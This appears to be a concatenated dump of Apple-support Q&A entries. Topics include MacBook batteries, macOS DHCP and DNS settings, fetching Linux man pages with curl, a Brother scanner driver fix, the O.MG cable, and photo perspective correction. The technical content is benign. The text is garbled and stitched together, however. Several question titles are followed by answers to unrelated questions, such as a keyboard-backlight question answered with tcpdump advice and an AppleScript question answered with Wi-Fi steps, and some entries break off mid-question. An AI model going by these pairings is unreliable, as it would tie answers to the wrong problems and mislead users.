at that point.)\nThe diagnostic test was performed in front on me, and my battery was approaching the threshold, but not quite. In the end, I smiled sweetly, and they offered me the cheaper price. (I did not have to pay for the test or Genius appointment.)\nThe design of the laptop means that they can't just replace the battery: they have to replace the entire 'top case'. So you get a new keyboard, trackpad and the outer frame as part of the cost, regardless of whether it's the cheaper rate or not.\nIf I remember, they quoted me 7 days for the work, but they turned it around in 48 hours.\n\nA: The repair shop will run an Apple Diagnostic (off of their server) that will report the battery health. If your system reports \"Replace Soon\", so will the Apple Diagnostic and you will be eligible for the discounted price of the \"Top Case\" replacement (which houses battery).\nOn certain MacBook Pro models Apple can run the diagnostic software via the Cloud, so you might be able to call AppleCare and they might offer you to run the battery diagnostic with you.\nThe only reason why you would not be eligible is if there is a different fault with the Top Case (such as a defective keyboard, physically damaged housing, liquid damage, ...).\nIn any case, the way the Service Provider should handle this is that you both agree to the price for battery replacement (250USD in your example) and if they encounter a different issue to give you a new quote (which you can accept or decline, in which case you'd pay the agreed amount of 40 USD (in your example) for their diagnostic work).\n", "Q: How to detect with AppleScript if something is playing?

They said they haven't, but you never know.\nThanks In advance,\nKrafter\n\nA: *\n\n*Rule out the WiFi\n\n\n*\n\n*Restart your Router\n\n*Check if other devices on the WiFi work properly\n\n\n\n*Check the Macs IP Settings (System Preferences, Network)\n\n\n*\n\n*Select WiFi network and click \"Advanced...\", under TCP/IP IPv4 should be \"Using DHCP\" and IPv6 should be set to \"Automatically\" (unless of course, your Router is configured otherwise)\n\n\n\n*Try an alternative DNS server\n\n\n*\n\n*In the same panel as before, select DNS, click the + and enter \"1.1.1.1\" (the public DNS from Cloudflare)\n\n\n\n*Check with a new \"Location\" (close the WiFi pane, on the top of the network preferences click \"Location\", \"Edit Locations...\", create a new one and switch to that, then join the WiFi again\n\n\n*Empty the DNS cache using Terminal:\n\n\n\n*\n\n*dscacheutil -flushcache;sudo killall -HUP mDNSResponder\n\n\n\n*Check for Malware\n\n\n*\n\n*Check Startup items in System Preferences, Users & Groups, , Login Items)\n\n*Check Launch Items (~/Library/LaunchAgents, /Library/LaunchAgents, /LaunchDaemons/) for unknown software\n\n*Use a tool (such as MalwareBytes)\n\n\nA: These solutions are appropriate for issues that affect Safari on Mac, including issues such as the following. Before you get started, make sure that your Mac is connected to the internet.\n\n*\n\n*A webpage is blank or doesn't show all of its content\n\n\n*You can't to sign in to a webpage, despite using the correct sign-in\ninformation\n\n\n*A webpage asks you to remove or reset cookies\n\n\n*Safari slows down or stops responding\nReload the page\nIf a page doesn't open or finish loading, try to reload it: Choose View > Reload Page or press Command-R. If that doesn't work, press Command-Q to quit Safari, then reopen Safari and try again. If Safari doesn't quit, press Option-Command-Esc to force Safari to quit.\nInstall software updates\nInstall all available Apple software updates, which can include updates for Safari. If you installed any Safari extensions, update them as well. \nTurn off Safari extensions\nEven if your Safari extensions are up to date, temporarily turn them off to be sure they aren't affecting Safari in unexpected ways. Choose Safari > Preferences, then click Extensions. To turn off an extension, deselect its checkbox.\nTest with a private window \nA website can store cookies, caches, and other data on your Mac, and issues with that data can affect your use of the website. To prevent the website from using that data, view the website in a private window: Choose File > New Private Window.\nIf that works, use the following steps to remove the website's data from your Mac. The website can then create new data as needed. If it's a website that you sign in to, make sure that you know your sign-in information before continuing.\nCheck network settings\nCertain network settings, such as those related to using a proxy server or custom DNS server, can affect access to content on the internet. Even if you haven't changed your network settings, you might have installed software that changed those settings for you.\nTo find out whether the issue is with the network settings on your Mac, try viewing the website from some other device connected to the same network. You can also add a new network location in Network preferences as a way to quickly reset your network settings for testing.\nTo find out whether the issue is with your network itself, try viewing the website after connecting to a different network.\nSource\n", "Q: How to disable the built-in DHCP from macOS network sharing I connect my iPhone to macOS to make macOS use iPhone's network.\nThen I connect a USB network adapter to macOS, setting macOS to share the network from \"iPhone USB\" to the USB network adapter.\nThe network adapter is connected to a standalone device acting as router, which runs OpenWrt.\nmacOS sets up a network 192.168.2.0/24 and every device that connects to OpenWrt would get DHCP lease with gateway 192.168.2.1, which is the macOS system.\nI need to disable this DHCP service from macOS, and make all devices connected to OpenWrt to get DHCP lease from it, especially, the DNS and gateway should be 192.168.2.11.\nAnother question is, how to change the subnet from 192.168.2.0/24 to 192.168.249.0/24?\nThanks.\n\n\n\nA: As suggested in this Apple Discussion post on editing the built in DHCP configuration, you have to edit the bootpd.plist file manually to change things like the IP address, gateway, and subnets your Mac uses.\nYou can find the bootpd.plist in root directory of your startup disk. There is an alias to the etc folder the bootpd.plist file is in, but the full path is your-startup-disk/private/etc.\nIf double-click on a .plist file, it will probably open in TextEdit, which can be a drag. Xcode, if you have it installed, will display the .plist file with a table structure that is easy to see and edit, like this:\n\nIf you don't have Xcode installed or do not want to install it, I suggest using BBEdit (it has a free 30 day trial) because it will color the xml formatting in the bootpd.plist file to make things easy to find and change, like this:\n\nOf course editing from the Terminal is always an option too: sudo vi /etc/bootpd.plist.\nAfter you make changes to the bootpd.plist file, you should stop the service from the Terminal:\nsudo /bin/launchctl unload -w /System/Library/LaunchDaemons/bootps.plist\n\nand to start it:\nsudo /bin/launchctl load -w /System/Library/LaunchDaemons/bootps.plist\n\nAlso, both of these commands may vary slightly depending on your version of MacOS. These commands came from this link\nTo disable the DHCP server, you will have to find this line in the bootpd.plist file:\n <key>dhcp_enabled</key>\n\nand just below it add <false> like this:\n <key>dhcp_enabled</key>\n <false/>\n\nReboot to test that the DHCP server is disabled.\n", "Q: Install linux manpages on macOS I have to regularly work with Linux machines that don't have man installed (don't ask me why). Is it possible to install Linux man pages on macOS? I'm thinking about help for commands like ip or ipset, or perhaps GNU variants of common Unix tools. I've been using manpages.me, but it's quite cumbersome as it's not as responsive as a command line tool and also defaults to displaying FreeBSD manpages.\n\nA: Here's one way to do it:\n\n*\n\n*Go to your Linux machine of choice and tar/zip the whole /usr/share/man directory.\n\n*Copy the archive to your Mac and uncompress it, say into ~/Documents/linux-man.\n\n*Use the -M switch to make man search in that folder: man -M ~/Documents/linux-man ip\n\n*Create a shell alias, function, or wrapper script for more convenient use. For example: lman() { man -M ~/Documents/linux-man \"$@\" }. Then you can do lman 7 ip.\n\n\nA: The recommendations to use man7.org and ss64.com are legit. I use both sites on a regular basis.\nBut I'm usually wanting to read man pages in the terminal, so I recently went looking for a semi-complete repository of GNU/Linux man pages in raw roff format, thinking I could groff -T utf8 them on-the-fly.\nI came up with a few options:\n\n*\n\n*Debian Manpages\n\n*the cgit instance for the Linux man-pages project\n\n*the cgit instance for the POSIX man pages on kernel.org\nHere's an example of a Bash function which fetches the requested manual page from the Debian Manpages server, then typesets it with groff.\n# fetch Debian Linux man pages from https://manpages.debian.org\nlman() {\n    local encoding=utf8\n    local lang=en\n    local baseurl='https://manpages.debian.org/stable'\n    local manpage=${1:?What manual page do you want?}\n\n    curl -sL \"$baseurl/$manpage.$lang.gz\" \\\n      | groff -man -T$encoding \\\n      | less\n}\n\nI have a recent groff from MacPorts, but the one that comes with macOS should be sufficient.\nOn my system, that produces an 80-column output. If you want to get fancy, here's how you can adjust the output to a specific number of columns (maxwidth), and center within the terminal. This greatly improves readability when your main display can show a lot of columns.\n# fetch Debian Linux man pages from https://manpages.debian.org and reformat\n# to `maxwidth` columns, centered within the terminal\nlman() {\n    local maxwidth=100\n    local encoding=utf8\n    local lang=en\n    local baseurl='https://manpages.debian.org/stable'\n    local termwidth=$(tput cols)\n    local width=$(( termwidth < maxwidth ? termwidth : maxwidth ))\n    local margin=$(( (termwidth - width) / 2 ))\n    local pad=$(printf \"%${margin}s\")\n    local manpage=${1:?What manual page do you want?}\n\n    curl -sL \"$baseurl/$manpage.$lang.gz\" \\\n      | groff -man -T$encoding -rLL=${width}n \\\n      | sed \"s/^/$pad/\" \\\n      | less\n}\n\nThe functions above aren't perfect, because of course the rendered man pages aren't cached so there's always a delay, and they don't differentiate between sections of the manual, e.g., crontab(1) vs. crontab(5). Implementing those features are left as an exercise for the reader. ;)\nTo fetch from one of the other sources mentioned above, such as the POSIX man pages from kernel.org, just adjust the URL fetched by curl as required. For example, the roff source for the POSIX cp man  page can be fetched from https://git.kernel.org/pub/scm/docs/man-pages/man-pages-posix.git/plain/man-pages-posix-2017/man1p/cp.1p, so you'd update the lman function like so:\n# fetch a POSIX man page from git.kernel.org's man-pages repository\npman() {\n    local encoding=utf8\n    local baseurl='https://git.kernel.org/pub/scm/docs/man-pages/man-pages-posix.git/plain/man-pages-posix-2017/man1p'\n    local manpage=${1:?What manual page do you want?}\n\n    curl -sL \"$baseurl/$manpage.1p\" \\\n      | groff -man -T$encoding \\\n      | less\n}\n\nDarkDust's answer is still the best if you need offline access, though.\n", "Q: Can AppleScript detect if Netflix or YouTube is playing?

If you have, e.g. Firefox playing video you would use just firefox in that clause, and just Google Chrome for Google Chrome.\nGenerally speaking parentheses around the do shell script command are not necessary, except in this use case to allow for the use of the line continuation character, ¬, to have been placed where it is. \n\nA: Wanted to post the final solution I ended up using. Based off @user3439894 example.\non mySay(p, myMessage)\n    if (do shell script \"pmset -g | grep -m 1 'displaysleep'\") ¬\n        does not contain \"prevented\" then\n        set myVolumeBefore to output volume of (get volume settings)\n        set volume output volume p\n        say myMessage\n        set volume output volume myVolumeBefore\n    end if\nend mySay\n\n", "Q: How to make MacBook Pro's keyboard backlight fade in and out?

If you're asking if there's something non-standard or invalid about the options/headers from macOS' TCP package - then the answer is no.\nYou have used the program tcpdump to produce the packet listing in your question. You could increase the verbosity of that program (-vvvv) to see more information about the actual header contents. You could also tell it to show the actual payload of the packets in order to examine any differences there.\n", "Q: Reset MacBook Air without admin account or command s I got a whole bunch of MacBooks from my old high school which I've repaired. The only issue is a few of them are still password locked, I tried the Command-S trick as you do but when I would hold it, it would just load into the user login screen. is there anyway to bypass this or a different method of wiping the macs?\nEdit: Ive also tried to swap out the nvme, I'm certain that the new one works but when I plug in the boot drive it asks for a password again.\n\nA: If the Mac asks for a password before boot (just a password field, no user name) what you are encountering is the firmware password, see https://support.apple.com/en-us/HT204455\nThe procedure to removing the firmware password depends on the MacBook model, for all Intel MacBook Air models without a T2 chip (pre-2018) only Apple can remove the firmware password. You will need to visit an Apple Authorised Service Center and bring proof that you own the device(s).\n", "Q: iPhone - location services can be disabled I have two kids using iPhones with Family Sharing.  In Screen Time under 'Content & Privacy Restriction', the option for Privacy > Share My Location is set to Don't Allow.  My understanding is that this will prevent them from turning it off under Screen Time on their device or prompt for the passcode I have set.\nWhat I'm also seeing is that under Settings > Privacy > Location Services, is the ability to turn this off which seems to override the previous setting and results in their device not showing in the Find My app.\nIs there any way to fix this?\n\nA: You want to enable sharing of location between family members and also want to ensure that your kids can't turn it off on their device.\nOn your kids phone -\nEnable Location Sharing:\nGo to Settings > Privacy > Location Services > Share My Location and tap on the toggle button to enable sharing the iPhone's location.\nEnable Restriction to Prevent Turning it Off:\n\n*\n\n*In Settings > Screen Time > Content & Privacy Restrictions > Share My Location, tap \"Don't Allow\".\n\n\n*In Settings > Screen Time > Content & Privacy Restrictions > Location Services, tap on \"Don't Allow Changes\".\nThe first step will lock \"Share My Location\" settings, and prevent it from being changed.

Those are the only two ports on the device apart from a 3.5 mm jack. One of the TB port is always occupied by a YubiKey which is a security device which needs to be plugged into the laptop for me to access office resources. I have read that Macs don't support daisy chaining so is there any way that I can have a 2 monitor set up with just 1 TB port ?\n\nA: Macs do support daisy-chaining over Thunderbolt. Depending on whether your monitors can be daisy-chained, you can either daisy-chain them or use a USB-C or Thunderbolt Hub to gain additional ports.\nYou could also plug in your YubiKey into one of the monitors if it has a built in hub.\n", "Q: Is it possible to convert an apple script w/ Idle to Shell Script? The Apple Script repeats every minute when saved as an application and the box is checked as \"stay open after run handler\". I used this method to convert it to Shell Script: How do I convert this Applescript to Terminal osascript? , but it won't repeat as it does in the Apple Script. However it will work without the idle commands, but of course, it doesn't repeat. How do I get it to work? Is there a better syntax to use to have it repeat than #idle, #return 60 #end idle?\nApple Script\non idle\n    tell application \"Finder\"\n        if not (disk \"Backup_Server\" exists) then\n            display alert \"Backup_Server not found, please mount\"\n        end if\n        delay 5\n        if not (disk \"Backup_Server\" exists) then\n            display alert \"Backup_Server still not found, please submit a ticket\"\n            return 60\n        end if\n    end tell\nend idle\non quit\n    continue quit\nend quit\n\nShell Script\n#!/usr/bin/osascript\non idle\n    tell application \"Finder\"\n        if not (disk \"Backup_Server\" exists) then\n            display alert \"Backup_Server not found, please mount\"\n        end if\n        delay 5\n        if not (disk \"Backup_Server\" exists) then\n            display alert \"Backup_Server still not found, please submit a ticket\"\n            return 60\n        end if\n    end tell\nend idle\non quit\n    continue quit\nend quit\n\n\nA: With an AppleScript script saved as a shell script you cannot use on idle, and return 60 unless you want return 60 to return 60\nUse a repeat loop instead of an on idle handler, and replace return with delay.\nThe on quit handler is only good if you issued a quit command elsewhere in the code, otherwise you'd need to use ⌃C to quit the AppleScript shell script to break out of the repeat loop, unless you have coded a way out of it.\n", "Q: Brother Printer works as a printer but not as a scanner The original question applied to printer model Brother HL-2280DW on Big Sur. But the question (and answer!) apply to other Brother printer models and other MacOS versions.\nIs there a way to get the scanner functionality to work?  As a printer it works without any extra drivers needed (just click \"add printer\" and it works with \"generic PCL printer\").  The drivers say they only support 10.15?\n\nA: I had the same issue. For me it was the Brother Printer HL-L2380DW on Monterey, but the behavior was the same. I could delete and re-add the printer with no problem. It would print, but it would not scan. Other computers on the same network could scan as expected. So it was clearly a computer issue, not a printer issue. Also, Brother's iPrint&Scan application is installed and current. But it cannot scan either.\nOne weird detail was that scanning worked at some point in the distant past. Then it stopped working. I don't scan often, so I'm not sure when it stopped. Perhaps when upgrading to Big Sur... but that's not certain. Upgrading from Big Sur to Monterey did not hurt, and it provided an updated driver... but it didn't give me the ability to scan. Another weird detail: Scanning via USB works. This is impractical for me, but it definitely works as a workaround.\n@rogerdpack says that deleting and re-adding the printer helped, but that wasn't the case for me. He also mentions \"Scanner Driver (ICA)\" driver, but without any instructions (or any verb!). He's correct that this is the key. I will elaborate with more precision.\nFor me the solution was:\n\n*\n\n*Download the Scanner Driver (ICA) (I used HL-L2380DW drivers, but the same concept applies to other models.)\n\n\n*Install the Scanner Driver (ICA)\n\n\n*FYI: notice that the driver gets installed here:\n/Library/Image Capture/Devices/Brother Scanner.app/\n\n\n*Uninstall the printer\n\n\n*Reinstall the printer\n\n\n*FYI: Reinstalling looks exactly like before. But now it includes Print AND Scan. Hooray!\n\n\n*FYI: Attempt to use the scanner. It fails. Repeat several times, and it fails each time.\n\n\n*FYI: Attempt to scan using the Mac \"Image Capture\" utility. It fails.\n\n\n*Attempt to scan using Brother's iPrint&Scan application. I hate this app. It used to not work, but now it works. Hooray?\nEDIT: based on comments it appears that rebooting could take the place of using iPrint&Scan for this step.\n\n\n*Attempt to use the scanner. It succeeds. Hooray!!\nIt's not at all clear why I had to run iPrint&Scan. Perhaps this is a red herring, and perhaps that's not truly required. But it really seemed like it was.\nMy end result is that basic scanning works exactly as intended from the Mac Printers & Scanners menu. But it was a lot of work and a lot of trial and error to get there.\n\nA: Seems if I installed the 10.15 driver \"regardless\" then deleted and re-added the printer, both scanning and printing show up now.  I installed the \"Scanner Driver (ICA)\" driver.  Seems from the comments and other answer this is needed, but not enough.\nMy macbook then gave the message \"You do not have permission to open the application “Brother Scanner”. Contact your computer or network administrator for assistance.\"  Based on https://discussions.apple.com/thread/253019354 I downloaded iprint&scan and it is working now.\n", "Q: Done downloading iMessages from iCloud but recent ones are missing I opened Messages on my MacBook Pro and clicked \"Enable Messages in iCloud\".\nIt said \"downloading\" (or something along those lines) for a good 10-15 minutes and then stopped, presumably done.\nHowever, certain messages are clearly missing that are on my iPhone (I only text from my iPhone). I think mostly from the last couple of days, but there could be more I'm not sure.\nIs that normal? Do iMessages from my iPhone only get uploaded to iCloud every few days or something?\nI tried \"Sync Now\" and it didn't do anything\n\nA: I had this exact problem with my 14 inch M1 macbook pro 2021, and iphone 13, running the latest OSes as of Feb 2022. My iphone had all my messages, but macbook was missing messages from about the last day or so.\n The way I solved it was to plug in (so that they are charging) both my macbook and iphone. Then, the macbook was still missing the messages. However, I then used my iphone and sent a single imessage to a family member (who also had iphone, so text message was blue) and instantly that message appeared on my macbook, along with all the missing messages from the past day.\n", "Q: Are Apple OSs vulnerable to the O.MG cable? macOS and iOS both seem always to ask whether to trust a device before allowing the exchange of data. Warnings about the O.MG cable claim it gains access to your data the moment you plug it in.\nHow does Apple ensure an administrator knowingly authorizes the transfer of data via hardware ports? Are there credible tests showing Apple successfully defends against the O.MG cable and similar attacks that rely on Lightning, USB-C, or Thunderbolt?\n\nA: From a software perspective, there's really nothing \"new\" about the O.MG cable - it doesn't exploit new vectors in the software or hardware of the computer.\nThe interesting thing about that cable is its form factor. I.e. if you pick up a random USB pen drive from the street, some people will instinctly think that it might not be a good idea to plug that into their computer - because they do not know what it contains. However, if you pick up a random charger cable from a desk in the break room, the same people perhaps wouldn't think twice about plugging it into their computer.\nThe thinking is along the lines of \"it's just a cable - what harm could it possibly do\". The interesting thing about the O.MG cable is simply that they it was now possible to easily get the components necessary to run a small microprocessor in a form factor so small that it really looks like \"just a cable\" - and not \"a cable with a big box or big bulge on it\".\nThe software running on the microprocessor in the cable tells the computer that it is a human-interface device - a fancy name for things like keyboards, mice, trackballs and the like. So the cable is basically a \"headless\" keyboard. At any point in time after plugging in the cable, the microprocessor could send USB packets to the computer telling the computer that the user pressed so and so buttons on the keyboard, or moved the mice so and so.\nThe cable does not as such gain access to the data on your computer. Your question seem to imply that plugging in the cable will somehow gain access to data - that's not the case. The microprocessor can send data to the computer - it does not receive data (payloads) from the computer as such. The microprocessor will need to send key presses (etc) to activate some software that would then send data to the microprocessor in the cable for any data transfer to happen. If your computer is for exampled locked (i.e. not logged in, FileVault enabled) - then none of your data can be transferred to the microprocessor in the cable.\nIf you imagine the microprocessor also having a wireless interface (i.e. think RF radio, Bluetooth, WiFi, etc) - then an attacker could sit in a nearby place with visibility of the victim. The victim plugs in the cable and goes by their day as usual - when the victim turns their back on the computer's monitor to talk to a colleague, the attacker wireless simulates keyboard presses and mouse movements to do whatever they want. This can then be done after the user has unlocked the computer.\nThis attack is essentially the same as someone, unknown to you, plugging in one of those tiny USB-dongles for wireless keyboards into your computer - and use that to remotely control your computer using the wireless keyboard.\nTheoretically the attack is easy to defend against. The computer should just not let anyone plug in keyboards and mouse. I.e. this is not some super difficult brain teaser of a complex attack.\nIn practice, home users would probably be very confused if they suddenly could not plugin keyboard and mouse and expect them to work. Therefore most major operating systems (like Windows, Mac, Linux) allows the user to plugin keyboards, mouse, etc. without any approval process.\nTo guard against the O.MG cable from a technically perspective (i.e. organisationally, you could teach user's to never use cable of unknown origin, or you could teach user's to use a special guard adapter that only connects the power pins of the cable into the computer) - you could do so that the user needs to approve keyboards, mice, etc. that are plugged into the computer.\nFor example that could be by having a message appear on the TouchBar on a MacBook Pro that the user needs to acknowledge with a tap.\nIt could also be simpler that the first keyboard and the first mouse that is plugged in is approved, but the following are not, and requires approval by typing something on the first keyboard.\n", "Q: Finder can show milliseconds - is this new in macOS? Finder can now show milli seconds in timestamps. Is this a recent change in macOS?\n\n\n\nYou can test it yourself, here how to show milliseconds for Finder. I have chosen 5 digits. This is the maximum.\nSystem Preferences -> Language & Region -> Advanced... -> Times -> Short:\n\n\nA: This change happened with the introduction of the APFS file system.\nTraditionally on Mac OS X the computer's disk drives were formatted with the HFS+ file system. This file system stores time stamps with a 1 second granularity. If you save a file at 12:04:31.4938, the file system actually only records 12:04:31 and doesn't have any more information for Finder to display.\nmacOS High Sierra was the first version of the operating system to replace HFS+ with APFS as the default file system. The APFS file system stores time stamps with a nano-second granularity. This means that if you save a file at 12:04:31.4938, the file system actually stores that full time stamp - allowing Finder to actually display that exact time stamp.\n", "Q: OSX Numbers Checking for either of two text values Using MacOS Numbers to count the number of cells containing hello or world:\n\n\n\n\n.\nY\n\n\n\n\n1\nhello\n\n\n2\nworld\n\n\n3\nhello world\n\n\n4\nworld world\n\n\n5\nworld hello\n\n\n6\nworld bye\n\n\n7\nhello flynt\n\n\n\n\nThe result I'm expecting is 7.\nI'm lost trying to figure out formulas :\nCOUNTIF(A1:A7;\"hello\")+COUNTIF(A1:A7;\"world\") will return 9.\nCOUNTIFS(A1:A7;\"hello\";A1:A7;\"world\") will return 2\nIs there a simple way to do this like in unix\ngrep -e hello -e world /tmp/test\n1|hello\n2|world\n3|hello world\n4|world world\n5|world hello\n6|world bye\n7|hello flynt\n\ngrep -e hello -e world /tmp/test | wc -l\n7\n\nThanks\n\nA: You actually have the answer there.

(My CPU is the one overheating.)\nThis also happened in the middle of it.\n\nMacBook:\n\n*\n\n*Apple - MacBook Pro - 13\" Display with Touch Bar\n\n*Intel Core i5\n\n*16GB Memory\n\n*512GB SSD\n\n*Space Gray\n\n\nA: *\n\n*If you are using your MBP on a soft surface, it interferes with airflow and will result in overheating. Correct this problem by using your MBP on a rigid surface. You can make your own lap pad or purchase any of the numerous products on the market for this purpose. A cheap laptop cooling pad also works but requires constant power.\n\n\n*Clean your cooling fans using compressed air.  Blow the compressed air through all openings in the MBP body, but primarily the fan vents on the back of the body, while MBP is running. Be aware this may result in a cloud of dust so wear a mask and do this outside if possible.\n\n\n*If you are the kind of user who is comfortable opening up the body of your MBP with appropriate Torx or pentalobe bits, cleaning with compressed air will be much more efficient and effective. Obviously, the usual warnings about voiding your warranty and potentially damaging sensitive electronic components in the MBP apply. Again, wear a mask and do this outside if possible.\nNonetheless, if you have had your MBP for several years and have never fully cleaned the \"dust rhinos\" out of the device's interior, the result can be amazingly gratifying and dramatically improve thermal performance.\n\n\n*You may have a case of the \"Chrome is Bad\" effect. Check out the full write-up at  https://chromeisbad.com for full details. In short, an update module called Keystone installed with Chrome can consume all available CPU resources and cause slow performance and overheating. Instructions in. the write-up at the web address listed above corrected the problem for me on my 2015 MBP.\n\n\n*Use Activity Monitor.app (/Application/Utilities/Activity Monitor.app) to identify the process(s) consuming all available CPU cycles as indicated in the last graph \"Utilization\" supplied in your initial post.\n-Launch Activity Monitor.app\n-Select the CPU tab in the Activity Monitor title bar.\n-Select the \"%CPU\" column and toggle it in descending order\nThe answer may be immediately obvious at that point but if not, begin using your MBP as usual and see what goes to the top of the %CPU list when you recreate the problem.\n\n\n*All of the above presupposes the following:\na. You are using up-to-date antivirus software\nb. You are not cryptomining or running BOINC\nc. That you have already reset your PRAM and SMC\nd. Your MBP has passed the Apple Hardware Diagnostics\nInstructions for these actions are available online.\nGood luck,\nc2\n", "Q: MacBook Air Battery capacity down to 93%! Should I worry? I have MacBook Air 2017 (8/128). I've been using it since 2019 on an occasional basis, not as a regular machine. The battery backup is pretty good. But recently I noticed from coconutBattery app that the battery capacity has downgraded to 93%. Cycle count of battery is just 33 though. Should I be concerned about it?\n\n\nA: The battery is already more than 2.5 years old from the manufacture date and even though the machine was used occasionally as you mention in the question, the battery will still degrade over time - just not as fast as with charging and discharging every day.\nThe storage temperature and battery charge also determine how quickly the battery degrades when stored for longer periods of time. This is mentioned on Apple's own website.\n\nDo not fully charge or fully discharge your device’s battery — charge it to around 50%. If you store a device when its battery is fully discharged, the battery could fall into a deep discharge state, which renders it incapable of holding a charge. Conversely, if you store it fully charged for an extended period of time, the battery may lose some capacity, leading to shorter battery life.\n\nLastly, I find from personal experience that the design capacity indicator fluctuates with the charge currently in the battery. On my 2018 MacBook Pro, there is about a 2 percent when the battery is nearly full charged vs nearly empty.\nIn conclusion, I would say there is no need to worry about it.\n\nA: Being at 93% after two years of regular use is relatively normal and, echoing what thejunejaster has said, is nothing to worry about.\nBatteries will degrade over time, as previously mentioned, regardless of use if not storing them in optimal conditions. For reference, a 33 cycle count would be extremely low (but expected given your use of the machine), and Apple recommends getting the battery serviced at 1000 cycles.\nThat being said, I'm at roughly 650 cycles on my 2014 MacBook Pro 15\" and my battery health reads 86%. I've also had mine serviced sometime roughly two or three years ago, so that's expected. I'd recommend keeping an eye on it over the course of the next year to see if it dips low quickly, but if it ever becomes a genuine concern you are welcome to make an appointment at your nearest Apple Store for a battery service (I believe mine was $200, and they replaced the bottom of the enclosure as well).\nHope this helps.\n", "Q: MBP can only connect to B-BOX-3V+ SMB share once, not twice or more The setup:\n\n*\n\n*8TB drive partitioned into 2 partitions of which one is 3.99TB (NAS-HOME)\n\n*This drive is hooked up to a Proximus (ISP) B-BOX-3V+ (router) USB1 port\n\n*The partition is formatted EXT3 as the router only recognizes FAT (all versions except exFAT), EXT2 and EXT3\n\n*The protocol in use is SMB1 as the router is an ISP-provided piece of &#$%\n\n*MacBook Pro (MBP) running macOS Big Sur Version 11.6\n\nThe issue:\n\n*\n\n*Whenever I reboot the MBP and go to Finder and click on Go To → Server and type:\nsmb://192.168.1.1/NAS-HOME/username\n\nthat just works and going to iTunes and importing the music library works.\n\n\n*Restarting the machine and doing the same with Photo library works too!\n\n\n*Trying to play iTunes music after Photo library has been opened (and not rebooting) fails with the following error message:\n\nConnection to the server \"192.168.1.1\" has encountered an error\nPlease try the server name or IP address again.

The USB 3.0 ports on my mid-2014 Macbook Pro Retina seem to run at USB 2.0 speeds maximum. A USB 3.0 memory stick connected through one of these ports shows as running at USB 2.0 speed (With further testing, the USB 3.0 memory stick is actually running at only ~340 Mbps). I have a few other peripherals connected but these seem to also run at 2.0 or even 1.1 speed.\nI've tried unplugging all devices, then plugging only the 3.0 device in - no difference.\nWhat is going on?\n\n\n*\n\n*Model Name:  MacBook Pro\n\n*Model Identifier: MacBookPro11,3\n\n*Host Controller Driver: AppleUSBXHCILPTH\n\n*Operating System: MacOS Mojave 10.14.6\n\nSearching 'AppleUSBXHCILPTH' brought up a similar query, but the user there was only concerned about seeing USB 1.1 speeds for the Apple Internal Keyboard/Trackpad; they didn't check USB 3.0 functionality.\n\nA: I would suggest making sure the USB pen drive is really fully plugged in (apply a bit of force). Then reboot the computer while the USB drive is plugged in, and the drive should come up with 3.0 speeds.\nThe reason behind this is that if you do not fully insert the drive, or you are too slow to insert the device in the port, it can be detected as a 2.0 device. This seems to be a general issue for the SanDisk Ultra product that also Windows users are experiencing.\n", "Q: Add note to phone number without using contacts in iOS Can the iPhone accomplish what I'm describing below?\nOn my Android when I view recent calls I can:\n\n*\n\n*Tap phone number\n\n*Tap i\n\n*Tap add note\n\n*Type a note such as \"May order 1000 widgets\".\n\nNow the next time the caller phones I will see in the caller display:\n555-555-5555.\nMay order 1000 widgets\nI find this very useful. I can decide to answer or let it go to voicemail.\nIs this possible in iOS?\n\nA: Contacts is the system that stores this information on iOS. So, you must create a contact card to add information to a phone number.\nI assume you know this already, but if you or anyone else is wondering:\n\n*\n\n*You can create a contact card from the recents list for any number that doesn't have one\n\n*You can assign a name, nickname, and write notes on a contact card\n\n", "Q: Does using a lower wattage power adapter for a MacBook increase its battery health? I have a 16\" MBP which comes with a 96W power adapter. With iPhones, I always heard that the faster you charge the battery (i.e., more power you use), the faster the battery degrades. So, instead of using a 96W charger, if I use a 60w charger will it increase the battery health?\nNote: I do not use very high-demanding tasks.\n\nA: A low-power charger may not have sufficient power to charge your laptop while you are using it. Even though it's plugged in, the charge level may still go down, or stay at the same level. Or it might go up, but only very slowly. If you have peripheral devices connected that use power, the problem may be worse.\nYour laptop draws the power that it needs, according to the power management hardware and software, which Apple spends 'some time and money' on optimizing. Any benefits from using a low-power charger are likely to be minimal, and offset by the inconvenience or other unforeseen problems.\nThere are so many factors that affect a battery's lifespan -- many of which are out of your control -- that my general advice is: just use your laptop as you need it, and don't try to micro-manage it.\n\nA: You mentioned:\n\nI do not use very high-demanding tasks.\n\nIn this scenario, as rightly pointed out by benwiggy, micro-managing your computer's battery is probably more hassle than it is worth.\nHowever, if you do choose to go this route, using a lower wattage charger is probably not the best solution. If you mostly use your computer plugged in to AC, you could look into limiting the battery charge to 80% using an application like AlDente.\nAlso, you could tweak with the fans on your MacBook to make them ramp up faster than Apple's defaults to keep all components in your computer, including the battery, cooler. There is another third-party app for this: Macs Fan Control (There may be other alternatives too, I use this one). Do not use this application if you don't know what you are doing - used improperly, it can make your computer unstable or damage it.\n", "Q: Can I Put an iPhone 6 and 6s together I’m using an old iPhone 6, and I’m frustrated to see those apps that require iOS 13. Luckily, I have an soaked iPhone 6s (went through the washing machine), which still works except for the camera and soaked display.\nThose two iPhones look identical. Will I somehow be able to “combine” these two iPhones into one so that I can use the A9 chip + iPhone 6 hardware + iPhone 6s hardware?\n\nA: While there are some parts that are interchangeable, the displays for example, are not - as they have different connectors.\n", "Q: How to adjust vertical & horizontal perspective for photos on Mac OS (like on iOS)? In Apple's Photo app on my iPhone, I can straighten and adjust vertical & horizontal perspective for photos as shown in my image below and also described on this page.\n\nBut in Apple's Photo app on my Mac I can only see how to straighten photos.  I see no way to adjust vertical & horizontal perspective (tilt) for photos.\nMy question is: how can I adjust vertical & horizontal perspective on photos using my Mac? I want to do this using apps that come with  Mac OS, like the Photo app, Preview, etc...\n\nA: Update: The desired feature is now present on a Mac using Photos 8.0 (511.0.180) (at least on my M1 MacAir running Mac OS 13.0.1). As shown in the screenshot below, the controls appear when using the \"crop\" tool while editing a photo. Since this post reached the status of a \"Notable Question\" (over 2500 views) perhaps someone at Apple paid attention.\n\n=====\nOriginal answer:\nAfter researching more I found an Apple site that claims the original question (“the controls to correct the horizontal or vertical perspective distortion\") is “simply not yet possible on a Mac”\nIn searching for other options, I learned that this is called a “keystone correction” or (perhaps less precisely) “distortion correction”\nAccording to this site “Currently Gimp is the only freeware graphics package I know that has the capability to correct distortions” and they provide instructions for how to do it.\nGiven the Apple’s trend to converge Mac OS and iOS features, it might become available. But until that time, it seems the shortest path to getting the desired result is to do the adjustments in the iOS Photos app and then transfer the photo to the mac.\n\nA: The only possibility to apply a keystone correction in macOS Photos (at the moment), is to download & install an extension (go the the 